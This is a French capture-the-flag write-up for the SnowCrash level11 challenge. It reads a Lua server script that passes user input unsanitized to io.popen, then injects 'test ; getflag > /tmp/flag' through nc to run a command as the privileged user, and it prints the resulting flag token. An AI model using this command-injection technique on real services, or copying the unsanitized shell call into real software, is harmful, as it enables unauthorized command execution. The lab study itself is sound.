Dans cet exercice nous avons un fichier executable en lua a la racine de notre home, on l'ouvre
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

L'on remarque que c'est un serveur tournant sur le port 5151, en essayant de lancer l'executable on obtient:
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?

Donc on en déduis que le programme tourne en arrière plan, on test:
level11@SnowCrash:~$ nc localhost 5151
Password: hgdkq
Erf nope..

Effectivement il est bien déjà démarrer, et donc avec les droits de flag11.
En regardant le code, on vois la fonction io.popen qui execute la commande echo, en regardant la doc on comprend la vulnérabilité:
https://www.lua.org/manual/5.1/manual.html#pdf-io.popen
on passe ce que tape l'utilisateur au shell...
Il ne nous reste donc plus qu'a faire:
level11@SnowCrash:~$ nc localhost 5151
Password: test ; getflag > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Voila!!!